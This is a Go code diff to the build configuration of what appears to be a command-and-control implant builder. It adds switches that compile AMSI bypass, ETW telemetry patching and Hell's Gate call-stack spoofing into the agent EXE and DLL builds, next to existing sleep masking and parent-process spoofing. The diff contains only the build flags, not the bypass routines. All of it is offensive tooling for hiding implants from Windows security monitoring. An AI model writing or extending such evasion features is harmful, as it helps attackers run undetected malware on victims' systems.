@@ -79,8 +79,12 @@ type BuildConfig struct {
 
 	// L2-1: Sleep mask mode — "xor" (default), "noaccess", "ekko"
 	SleepMaskMode string `json:"sleep_mask_mode"`
-	// L2-2: AMSI bypass method — "patch" (default), "veh"
+	// L2-2: AMSI bypass method — "" / "none" = disabled, "patch" = byte patch, "veh" = patchless VEH
 	AMSIMethod string `json:"amsi_method"`
+	// L2-2b: ETW bypass — patch EtwEventWrite to suppress telemetry
+	ETWBypass bool `json:"etw_bypass"`
+	// L2-2c: Call-stack spoofing — Hell's Gate SSN stubs to hide agent frames
+	StackSpoof bool `json:"stack_spoof"`
 	// L2-3: PPID spoof target process name
 	PPIDSpoof string `json:"ppid_spoof"`
 	// L2-4: Apply transform obfuscation to embedded payloads
@@ -650,6 +654,16 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 		}
 		args = append(args, fmt.Sprintf("-DAGENT_SLEEP_MASK_MODE=%d", sleepMaskNum))
 	}
+	// AMSI bypass — only when explicitly selected (not "none"/empty)
+	if cfg.AMSIMethod != "" && cfg.AMSIMethod != "none" {
+		args = append(args, "-DAGENT_AMSI_BYPASS=1")
+	}
+	if cfg.ETWBypass {
+		args = append(args, "-DAGENT_ETW_BYPASS=1")
+	}
+	if cfg.StackSpoof {
+		args = append(args, "-DAGENT_STACK_SPOOF=1")
+	}
 	args = append(args, sources...)
 	args = append(args, "-lwinhttp", "-lbcrypt", "-lws2_32", "-lcrypt32", "-lsecur32", "-lgdi32", "-lole32", "-loleaut32")
 
@@ -748,6 +762,15 @@ func BuildCAgentDLL(cfg BuildConfig, outDir string) (string, error) {
 		case "foliage":  sleepMaskNum = 4
 		}
 		args = append(args, fmt.Sprintf("-DAGENT_SLEEP_MASK_MODE=%d", sleepMaskNum))
+	}
+	if cfg.AMSIMethod != "" && cfg.AMSIMethod != "none" {
+		args = append(args, "-DAGENT_AMSI_BYPASS=1")
+	}
+	if cfg.ETWBypass {
+		args = append(args, "-DAGENT_ETW_BYPASS=1")
+	}
+	if cfg.StackSpoof {
+		args = append(args, "-DAGENT_STACK_SPOOF=1")
 	}
 	args = append(args, sources...)
 	args = append(args, "-lwinhttp", "-lbcrypt", "-lws2_32", "-lcrypt32", "-lsecur32", "-lgdi32", "-lole32", "-loleaut32")
